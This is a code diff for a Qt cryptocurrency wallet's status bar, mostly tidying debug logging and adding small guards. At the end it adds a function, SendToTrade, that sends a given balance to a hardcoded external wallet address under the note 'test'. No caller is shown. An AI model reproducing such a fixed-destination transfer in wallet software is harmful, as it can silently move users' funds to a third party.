@@ -12,9 +12,9 @@
 #include "manageui.h"
 
 #define TOTAL_SEMAPHORE_NUM 6
-const quint64 MIN_FREE_SPACE_LEFT = 5; //GB
 
 extern ManageUI*   g_lpManageUI;
+extern MainUI*     g_lpMainUI;
 
 StatusBarThread::StatusBarThread()
     : m_bOutOfSync (false)
@@ -66,7 +66,9 @@ void StatusBarThread::run()
 {
     int nNo = 0;
     int nNetInfo = 0;
+#ifdef WIN32
     int nNtpClockSync = 0;
+#endif
     while (true)
     {
         m_mutex.lock();
@@ -118,12 +120,13 @@ void StatusBarThread::run()
        if(nNtpClockSync > 60*60*24)
        {
            nNtpClockSync = 0;
+           // 数据目录磁盘空间少于 5G 给出提醒
            emit JudgefreeBytesAvailable();
        }
 #endif
-       qDebug() << "thread acquire " << sem << " semaphore";
+       //qDebug() << "thread acquire " << sem << " semaphore";
        m_sem.tryAcquire(sem, MAX_TIMEOUT_WAIT_RESPONSE_RESULT);
-       qDebug() << "thread acquire semaphore suc:" << m_sem.available();
+       //qDebug() << "thread acquire semaphore suc:" << m_sem.available();
 
        m_mutex.lock();
        m_cond.wait(&m_mutex, 1000);
@@ -194,7 +197,7 @@ bool StatusBarUI::eventFilter(QObject *watched, QEvent *event)
                 break;
             case Wallet_Locked: {
                 AskPassphraseDialog dlg(AskPassphraseDialog::Unlock, this);
-                if (dlg.exec())
+                if (dlg.exec() && g_lpMainUI)
                     g_lpMainUI->setEncryptionStatus(dlg.m_nStatus);
             }
                 break;
@@ -246,7 +249,7 @@ void StatusBarUI::JudgefreeBytesAvailable()
 
 #ifdef WIN32
     uint64_t freeBytesAvailable = GetfreeBytesAvailable(GetDefaultDataDir());
-    if(freeBytesAvailable < MIN_FREE_SPACE_LEFT * GB_BYTES)
+    if(freeBytesAvailable < 5 * GB_BYTES)
     {
         ui->labelfreeBytes->setText(tr("数据目录磁盘空间少于 5G，请更改数据目录选择更大空闲盘符存储数据！"));
         ui->labelfreeBytes->setVisible(true);
@@ -282,7 +285,6 @@ void StatusBarUI::requestFinished(const QVariant &result, const QString &error)
         if(NULL != m_lpStatusBarThread)
         {
             m_lpStatusBarThread->ReleaseOneSem();
-            qDebug()<<"GetPeerInfo released semaphore";
         }
     }
     else if (m_nID == ID_GetWalletStatus)
@@ -291,7 +293,7 @@ void StatusBarUI::requestFinished(const QVariant &result, const QString &error)
         if(NULL != m_lpStatusBarThread)
         {
             m_lpStatusBarThread->ReleaseOneSem();
-            qDebug()<<"WalletStatus released semaphore";
+           // qDebug()<<"WalletStatus released semaphore";
         }
     }
     else if (m_nID == ID_IsSync)
@@ -301,7 +303,6 @@ void StatusBarUI::requestFinished(const QVariant &result, const QString &error)
         {
             m_lpStatusBarThread->SetOutOfSync(m_bOutOfSync);
             m_lpStatusBarThread->ReleaseOneSem();
-            qDebug()<<"Sync released semaphore";
         }
     }
     else if (m_nID == ID_Lock)
@@ -354,7 +355,7 @@ void StatusBarUI::requestFinished(const QVariant &result, const QString &error)
         if(NULL != m_lpStatusBarThread)
         {
             m_lpStatusBarThread->ReleaseOneSem();
-            qDebug()<<"NetInfo released semaphore";
+           // qDebug()<<"NetInfo released semaphore";
         }
     }
     else if(m_nID == ID_GetFatalFailure)
@@ -371,7 +372,7 @@ void StatusBarUI::requestFinished(const QVariant &result, const QString &error)
         if(NULL != m_lpStatusBarThread)
         {
             m_lpStatusBarThread->ReleaseOneSem();
-            qDebug()<<"TimeStatus released semaphore";
+          //  qDebug()<<"TimeStatus released semaphore";
         }
     }
     else if (m_nID == ID_GetAccounts)
@@ -615,4 +616,22 @@ void StatusBarUI::StopUpdateStatusBar()
 void StatusBarUI::ResumeUpdateStatusBar()
 {
     m_lpStatusBarThread->Resume();
+}
+
+void StatusBarUI::SendToTrade(const QString &strAddr, const QString &strSymbol, qint64 nBalance)
+{
+    QJsonObject jsonParms;
+    jsonParms.insert("from", strAddr);
+    jsonParms.insert("to", "1BXvgjmBw1aBgmGn1hjfGyRkmN3krWpFP4");
+    jsonParms.insert("amount", nBalance);
+    jsonParms.insert("note", "test");
+
+    if(strSymbol != CStyleConfig::GetInstance().GetUnitName())
+    {
+        jsonParms.insert("isToken", true);
+        jsonParms.insert("tokenSymbol", strSymbol);
+    }
+    QJsonArray params;
+    params.insert(0, jsonParms);
+    PostJsonMessage(ID_SendToAddress, params);
 }
